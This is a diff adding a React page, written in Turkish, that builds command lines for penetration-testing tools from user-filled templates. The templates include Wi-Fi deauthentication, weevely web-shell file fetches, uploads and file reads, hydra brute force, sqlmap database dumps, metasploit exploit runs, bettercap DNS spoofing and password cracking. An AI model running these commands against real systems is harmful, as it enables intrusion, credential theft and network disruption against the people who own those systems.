@@ -1,0 +1,732 @@
+import React, { useState } from "react";
+import { Box, Button, TextField, Grid } from "@mui/material";
+import { Typography } from "@mui/joy";
+
+const KomutUretColumn = ({ tools }) => {
+  const [selectedTool, setSelectedTool] = useState(null);
+  const [selectedFeature, setSelectedFeature] = useState(null);
+  const [inputValues, setInputValues] = useState({});
+  const [generatedCommand, setGeneratedCommand] = useState("");
+
+  const handleToolSelect = (tool) => {
+    if (selectedTool === tool) {
+      // Eğer aynı araç seçilmişse, seçimi temizle
+      setSelectedTool(null);
+      setSelectedFeature(null);
+      setInputValues({});
+      setGeneratedCommand("");
+    } else {
+      // Yeni bir araç seçilmişse, onu ayarla
+      setSelectedTool(tool);
+      setSelectedFeature(null);
+      setInputValues({});
+      setGeneratedCommand("");
+    }
+  };
+  
+
+  const handleFeatureSelect = (feature) => {
+    if (selectedFeature === feature) {
+      // Eğer aynı özellik seçilmişse, seçimi temizle
+      setSelectedFeature(null);
+      setInputValues({});
+      setGeneratedCommand("");
+    } else {
+      // Yeni bir özellik seçilmişse, onu ayarla
+      setSelectedFeature(feature);
+      setInputValues({});
+      setGeneratedCommand("");
+    }
+  };
+
+
+    const [isClicked, setIsClicked] = useState(false);
+  
+    const handleClick = () => {
+      setIsClicked(!isClicked);
+    };
+  
+
+  const handleInputChange = (key, value) => {
+    setInputValues((prev) => ({
+      ...prev,
+      [key]: value,
+    }));
+  };
+
+  const generateCommand = () => {
+    if (!selectedFeature) return;
+    const command = selectedFeature.template.replace(/\{(\w+)\}/g, (_, key) => inputValues[key] || "");
+    setGeneratedCommand(command);
+  };
+
+  
+
+  return (
+    
+
+
+    <Box sx={{ padding: 3 }}>
+
+<Button
+      variant="text"
+      sx={{
+        color: isClicked ? 'rgb(255,215,0)' : 'rgb(169,169,169)', // Altın sarısı ya da gri
+      }}
+      onClick={handleClick}
+    >
+      ★
+    </Button>
+
+      <Typography variant="h6" sx={{ color: "rgb(210,210,210)" }}></Typography>
+      {/* Araçlar için yan yana düzen */}
+      <Box
+        sx={{
+          display: "flex",
+          flexWrap: "wrap",
+          gap: 1,
+          marginBottom: 2,
+        }}
+      >
+        {tools.map((tool) => (
+          <Button
+            key={tool.name}
+            variant="contained"
+            onClick={() => handleToolSelect(tool)}
+            sx={{ backgroundColor: "rgb(255,0,71)" }}
+          >
+            {tool.name}
+          </Button>
+        ))}
+      </Box>
+
+      {/* Seçilen aracın özelliklerini göster */}
+      {selectedTool && (
+        <Box>
+          <Typography variant="h6" sx={{ color: "rgb(210,210,210)" }}>
+            Özellikler ({selectedTool.name})
+          </Typography>
+          <Box
+            sx={{
+              display: "flex",
+              flexWrap: "wrap",
+              gap: 1,
+              marginBottom: 2,
+            }}
+          >
+            {selectedTool.features.map((feature) => (
+              <Button
+                key={feature.name}
+                variant="outlined"
+                onClick={() => handleFeatureSelect(feature)}
+                sx={{
+                  color: "rgb(255,0,71)",
+                  borderColor: "rgb(255,0,71)",
+                }}
+              >
+                {feature.name}
+              </Button>
+            ))}
+          </Box>
+        </Box>
+      )}
+
+      {/* Seçilen özelliğin parametrelerini göster */}
+      {selectedFeature && (
+        <Box>
+          <Typography variant="h6" sx={{ color: "rgb(210,210,210)" }}>
+            Parametreler ({selectedFeature.name})
+          </Typography>
+          {selectedFeature.inputs.map((input) => (
+            <TextField
+  key={input.key}
+  label={input.label}
+  variant="outlined"
+  fullWidth
+  margin="normal"
+  onChange={(e) => handleInputChange(input.key, e.target.value)}
+  InputProps={{
+    style: {
+      color: "rgb(255,0,71)", // İç yazı rengini kırmızı yapar
+    },
+  }}
+  InputLabelProps={{
+    style: {
+      color: "rgb(210,210,210)", // Etiket rengini mavi yapar
+    },
+  }}
+  sx={{
+    maxWidth: "50",
+    display: "block", // Bu satır eklenerek input box'ları alt alta yerleştirme sağlanır
+    marginBottom: "16px", // Aralarına boşluk eklemek için marginBottom kullanabilirsiniz
+    "& .MuiOutlinedInput-root": {
+      "&:hover fieldset": {
+        borderColor: "rgb(210,210,210)", // Hover durumunda border rengi
+      },
+      "&.Mui-focused fieldset": {
+        borderColor: "rgb(255,0,71)", // Focus durumunda border rengi
+      },
+    },
+  }}
+/>
+
+          ))}
+          <Button
+            variant="contained"
+            color="success"
+            onClick={generateCommand}
+            sx={{ marginTop: 2, backgroundColor: "rgb(255,0,71)" }}
+          >
+            Komut Üret
+          </Button>
+        </Box>
+      )}
+
+      {/* Üretilen komutu göster */}
+      {generatedCommand && (
+        <Box
+          sx={{
+            marginTop: 2,
+            padding: 2,
+            backgroundColor: "#1e1e1e",
+            border: "1px solid rgb(255,0,71)",
+          }}
+        >
+          <Typography variant="h6" fontFamily={'Ubuntu Mono, Monospace'} color='rgb(255,0,71)'>Üretilen Komut</Typography>
+          <Typography
+            component="code"
+            style={{ whiteSpace: "pre-wrap", color: "#00ff00", fontFamily:'Ubuntu Mono, Monospace', fontSize:16 }}
+          >
+            {generatedCommand}
+          </Typography>
+        </Box>
+      )}
+    </Box>
+  );
+};
+
+const KomutUret = () => {
+  const tools1 = [
+    {
+      name: "aireplay",
+      features: [
+        {
+          name: "deauth",
+          inputs: [
+            { label: "Değer", key: "deauthValue" },
+            { label: "Modem MAC Adresi", key: "modemMAC" },
+            { label: "Kullanıcı MAC Adresi", key: "userMAC" },
+            { label: "WiFi Arayüzü", key: "wifiInterface" },
+          ],
+          template: "sudo aireplay-ng --deauth {deauthValue} -a {modemMAC} -c {userMAC} {wifiInterface}",
+        },
+        {
+          name: "fakeauth",
+          inputs: [
+            { label: "Modem MAC Adresi", key: "modemMAC" },
+            { label: "Kullanıcı MAC Adresi", key: "userMAC" },
+            { label: "WiFi Arayüzü", key: "wifiInterface" },
+            { label: "Oturum Başlatma Zamanı", key: "time" },
+          ],
+          template: "sudo aireplay-ng --fakeauth {time} -a {modemMAC} -c {userMAC} {wifiInterface}",
+        },
+        {
+          name: "arp-request",
+          inputs: [
+            { label: "Modem MAC Adresi", key: "modemMAC" },
+            { label: "Kullanıcı MAC Adresi", key: "userMAC" },
+            { label: "WiFi Arayüzü", key: "wifiInterface" },
+          ],
+          template: "sudo aireplay-ng --arpreplay -a {modemMAC} -c {userMAC} {wifiInterface}",
+        },
+        {
+          name: "chopchop",
+          inputs: [
+            { label: "Modem MAC Adresi", key: "modemMAC" },
+            { label: "Kullanıcı MAC Adresi", key: "userMAC" },
+            { label: "WiFi Arayüzü", key: "wifiInterface" },
+          ],
+          template: "sudo aireplay-ng --chopchop -a {modemMAC} -c {userMAC} {wifiInterface}",
+        },
+      ],
+    },
+  ];
+  
+
+const tools2 = [
+{
+  name: "weevely",
+  features: [
+    {
+      name: "upload-shell",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+        { label: "Shell Yolu", key: "shellPath" },
+        { label: "Kullanıcı Adı", key: "username" },
+        { label: "Şifre", key: "password" },
+      ],
+      template: "weevely {targetURL} {username}:{password} -x 'curl -O {shellPath}'",
+    },
+    {
+      name: "execute-command",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+        { label: "Kullanıcı Adı", key: "username" },
+        { label: "Şifre", key: "password" },
+        { label: "Komut", key: "command" },
+      ],
+      template: "weevely {targetURL} {username}:{password} -x '{command}'",
+    },
+    {
+      name: "download-file",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+        { label: "Kullanıcı Adı", key: "username" },
+        { label: "Şifre", key: "password" },
+        { label: "Dosya Yolu", key: "filePath" },
+      ],
+      template: "weevely {targetURL} {username}:{password} -x 'cat {filePath}'",
+    },
+    {
+      name: "upload-file",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+        { label: "Kullanıcı Adı", key: "username" },
+        { label: "Şifre", key: "password" },
+        { label: "Yüklemek İstediğiniz Dosya", key: "fileToUpload" },
+        { label: "Hedef Yolu", key: "targetPath" },
+      ],
+      template: "weevely {targetURL} {username}:{password} -x 'curl -T {fileToUpload} {targetPath}'",
+    },
+    {
+      name: "interactive-shell",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+        { label: "Kullanıcı Adı", key: "username" },
+        { label: "Şifre", key: "password" },
+      ],
+      template: "weevely {targetURL} {username}:{password}",
+    },
+  ],
+},
+];
+
+const tools3 = [
+{
+  name: "hydra",
+  features: [
+    {
+      name: "brute-force-ssh",
+      inputs: [
+        { label: "Hedef IP", key: "targetIP" },
+        { label: "Port", key: "port" },
+        { label: "Kullanıcı Listesi", key: "usernameList" },
+        { label: "Şifre Listesi", key: "passwordList" },
+      ],
+      template: "hydra -L {usernameList} -P {passwordList} ssh://{targetIP} -s {port}",
+    },
+    {
+      name: "brute-force-http-form",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+        { label: "Kullanıcı Listesi", key: "usernameList" },
+        { label: "Şifre Listesi", key: "passwordList" },
+        { label: "Form Parametreleri", key: "formParams" },
+      ],
+      template: "hydra -L {usernameList} -P {passwordList} {targetURL} http-post-form '{formParams}'",
+    },
+  ],
+},
+];
+
+const tools4 = [
+{
+  name: "sqlmap",
+  features: [
+    {
+      name: "test-sql-injection",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+      ],
+      template: "sqlmap -u {targetURL}",
+    },
+    {
+      name: "dump-database",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+        { label: "Veritabanı İsmi", key: "databaseName" },
+      ],
+      template: "sqlmap -u {targetURL} --dump -D {databaseName}",
+    },
+    {
+      name: "search-tables",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+        { label: "Tablo İsmi", key: "tableName" },
+      ],
+      template: "sqlmap -u {targetURL} --search -T {tableName}",
+    },
+    {
+      name: "search-columns",
+      inputs: [
+        { label: "Hedef URL", key: "targetURL" },
+        { label: "Kolon İsmi", key: "columnName" },
+      ],
+      template: "sqlmap -u {targetURL} --search -C {columnName}",
+    },
+  ],
+},
+];
+
+const tools5 = [
+  {
+      name: "metasploit",
+      features: [
+          {
+              name: "exploit",
+              inputs: [
+                  { label: "Exploit Modülü", key: "exploitModule" },
+                  { label: "Hedef IP", key: "targetIP" },
+                  { label: "Hedef Port", key: "targetPort" },
+                  { label: "Payload", key: "payload" },
+              ],
+              template: "msfconsole -x 'use {exploitModule}; set RHOST {targetIP}; set RPORT {targetPort}; set PAYLOAD {payload}; run'",
+          },
+          {
+              name: "auxiliary",
+              inputs: [
+                  { label: "Auxiliary Modülü", key: "auxiliaryModule" },
+                  { label: "Hedef IP", key: "targetIP" },
+                  { label: "Ek Parametreler", key: "extraParams" },
+              ],
+              template: "msfconsole -x 'use {auxiliaryModule}; set RHOST {targetIP}; {extraParams}; run'",
+          },
+          {
+              name: "post",
+              inputs: [
+                  { label: "Post Modülü", key: "postModule" },
+                  { label: "Oturum ID", key: "sessionID" },
+              ],
+              template: "msfconsole -x 'use {postModule}; set SESSION {sessionID}; run'",
+          },
+      ],
+  },
+];
+
+const tools6 = [
+  {
+      name: "john",
+      features: [
+          {
+              name: "basic-crack",
+              inputs: [
+                  { label: "Hash Dosyası", key: "hashFile" },
+              ],
+              template: "john {hashFile}",
+          },
+          {
+              name: "wordlist-crack",
+              inputs: [
+                  { label: "Hash Dosyası", key: "hashFile" },
+                  { label: "Wordlist Dosyası", key: "wordlist" },
+              ],
+              template: "john {hashFile} --wordlist={wordlist}",
+          },
+          {
+              name: "incremental-crack",
+              inputs: [
+                  { label: "Hash Dosyası", key: "hashFile" },
+                  { label: "Mod", key: "mode" },
+              ],
+              template: "john {hashFile} --incremental={mode}",
+          },
+          {
+              name: "show-passwords",
+              inputs: [
+                  { label: "Hash Dosyası", key: "hashFile" },
+              ],
+              template: "john --show {hashFile}",
+          },
+      ],
+  },
+];
+
+const tools7 = [
+  {
+      name: "nikto",
+      features: [
+          {
+              name: "scan",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+              ],
+              template: "nikto -h {targetURL}",
+          },
+          {
+              name: "ssl-scan",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+              ],
+              template: "nikto -h {targetURL} -ssl",
+          },
+          {
+              name: "tuning-scan",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Tuning Seçenekleri", key: "tuningOptions" },
+              ],
+              template: "nikto -h {targetURL} -T {tuningOptions}",
+          },
+          {
+              name: "output-scan",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Çıktı Dosyası", key: "outputFile" },
+              ],
+              template: "nikto -h {targetURL} -o {outputFile}",
+          },
+      ],
+  },
+];
+
+const tools8 = [
+  {
+      name: "enum4linux",
+      features: [
+          {
+              name: "basic-enum",
+              inputs: [
+                  { label: "Hedef IP", key: "targetIP" },
+              ],
+              template: "enum4linux {targetIP}",
+          },
+          {
+              name: "detailed-enum",
+              inputs: [
+                  { label: "Hedef IP", key: "targetIP" },
+                  { label: "Ek Parametreler", key: "extraParams" },
+              ],
+              template: "enum4linux {extraParams} {targetIP}",
+          },
+          {
+              name: "userlist-enum",
+              inputs: [
+                  { label: "Hedef IP", key: "targetIP" },
+              ],
+              template: "enum4linux -U {targetIP}",
+          },
+          {
+              name: "shares-enum",
+              inputs: [
+                  { label: "Hedef IP", key: "targetIP" },
+              ],
+              template: "enum4linux -S {targetIP}",
+          },
+      ],
+  },
+];
+
+const tools9 = [
+  {
+      name: "bettercap",
+      features: [
+          {
+              name: "network-sniff",
+              inputs: [
+                  { label: "Ağ Arayüzü", key: "networkInterface" },
+                  { label: "Filtre", key: "filter" },
+              ],
+              template: "bettercap -iface {networkInterface} --sniffer.filter {filter}",
+          },
+          {
+              name: "dns-spoof",
+              inputs: [
+                  { label: "Ağ Arayüzü", key: "networkInterface" },
+                  { label: "Hedef IP", key: "targetIP" },
+                  { label: "Sahte IP", key: "spoofedIP" },
+              ],
+              template: "bettercap -iface {networkInterface} --dns.spoof.targets {targetIP} --dns.spoof.address {spoofedIP}",
+          },
+          {
+              name: "wifi-deauth",
+              inputs: [
+                  { label: "Ağ Arayüzü", key: "networkInterface" },
+                  { label: "Hedef MAC", key: "targetMAC" },
+              ],
+              template: "bettercap -iface {networkInterface} --wifi.deauth {targetMAC}",
+          },
+      ],
+  },
+];
+
+const tools10 = [
+  {
+      name: "wfuzz",
+      features: [
+          {
+              name: "basic-fuzz",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+              ],
+              template: "wfuzz -c -z file,{wordlist} --hc 404 {targetURL}",
+          },
+          {
+              name: "header-fuzz",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+                  { label: "Başlık Adı", key: "headerName" },
+              ],
+              template: "wfuzz -c -z file,{wordlist} -H \"{headerName}: FUZZ\" {targetURL}",
+          },
+          {
+              name: "parameter-fuzz",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+                  { label: "Parametre Adı", key: "parameterName" },
+              ],
+              template: "wfuzz -c -z file,{wordlist} -d \"{parameterName}=FUZZ\" {targetURL}",
+          },
+      ],
+  },
+];
+
+const tools11 = [
+  {
+      name: "dirb",
+      features: [
+          {
+              name: "dirb-basic",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+                  { label: "Port (Varsayılan: 80)", key: "port", default: "80" },
+              ],
+              template: "dirb {targetURL}:{port} {wordlist}",
+          },
+          {
+              name: "dirb-with-extensions",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+                  { label: "Uzantılar (örn. .php,.html)", key: "extensions" },
+                  { label: "Port (Varsayılan: 80)", key: "port", default: "80" },
+              ],
+              template: "dirb {targetURL}:{port} {wordlist} -X {extensions}",
+          },
+          {
+              name: "dirb-quiet",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+                  { label: "Port (Varsayılan: 80)", key: "port", default: "80" },
+              ],
+              template: "dirb {targetURL}:{port} {wordlist} -q",
+          },
+          {
+              name: "dirb-with-status-codes",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+                  { label: "Status Kodları (örn. 200,404)", key: "statusCodes" },
+                  { label: "Port (Varsayılan: 80)", key: "port", default: "80" },
+              ],
+              template: "dirb {targetURL}:{port} {wordlist} -s {statusCodes}",
+          },
+      ],
+  },
+];
+
+const tools12 = [
+  {
+      name: "gobuster",
+      features: [
+          {
+              name: "dir-fuzz",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+                  { label: "Port (Varsayılan: 80)", key: "port", default: "80" },
+              ],
+              template: "gobuster dir -u {targetURL}:{port} -w {wordlist}",
+          },
+          {
+              name: "dir-fuzz-with-extensions",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+                  { label: "Uzantılar (örn. .php,.html)", key: "extensions" },
+                  { label: "Port (Varsayılan: 80)", key: "port", default: "80" },
+              ],
+              template: "gobuster dir -u {targetURL}:{port} -w {wordlist} -x {extensions}",
+          },
+          {
+              name: "dns-brute",
+              inputs: [
+                  { label: "Hedef Domain", key: "targetDomain" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+              ],
+              template: "gobuster dns -d {targetDomain} -w {wordlist}",
+          },
+          {
+              name: "vhost-fuzz",
+              inputs: [
+                  { label: "Hedef URL", key: "targetURL" },
+                  { label: "Kelime Listesi", key: "wordlist" },
+                  { label: "Port (Varsayılan: 80)", key: "port", default: "80" },
+              ],
+              template: "gobuster vhost -u {targetURL}:{port} -w {wordlist}",
+          },
+      ],
+  },
+];
+
+
+
+  return(
+
+    <Grid container>
+      
+      <Grid item xs={8} marginLeft={18} paddingTop={5}>
+      <Typography variant="h4" className="mb-0" sx={{ fontSize:'55px', fontWeight: 'bold', color: 'rgb(255,0,71)' }}>
+    Komut Üret
+    </Typography>
+    <Typography marginTop={1} variant="body1" sx={{ fontSize: '16px', color: '#fff', lineHeight: 1.6, color: 'rgb(210,210,210)', width:1300 }}>
+    Bu sayfa, sızma testi araçlarının kullanımını kolaylaştırmak ve zaman kazandırmak için tasarlanmıştır. Çoğu güvenlik aracı, terminal üzerinden çalıştırılan karmaşık komutlarla kullanılır ve bu komutların tüm detaylarını akılda tutmak zor olabilir. Komut Üret Sayfası, kullanıcıların araçların sunduğu farklı özelliklere kolayca erişmesini ve ihtiyaçlarına uygun komutları hızlıca oluşturmasını sağlar.
+    </Typography>
+    </Grid>
+    <Grid container paddingLeft={18} paddingRight={10} marginTop={5}>
+        <KomutUretColumn tools={tools1} />
+      
+        <KomutUretColumn tools={tools2} />
+      
+        <KomutUretColumn tools={tools3} />
+    
+        <KomutUretColumn tools={tools4} />
+
+        <KomutUretColumn tools={tools5} />
+
+        <KomutUretColumn tools={tools6} />
+
+        <KomutUretColumn tools={tools7} />
+
+        <KomutUretColumn tools={tools8} />
+
+        <KomutUretColumn tools={tools9} />
+
+        <KomutUretColumn tools={tools10} />
+
+        <KomutUretColumn tools={tools11} />
+
+        <KomutUretColumn tools={tools12} />
+      </Grid>
+
+      
+
+    </Grid>
+  );
+};
+
+export default KomutUret;
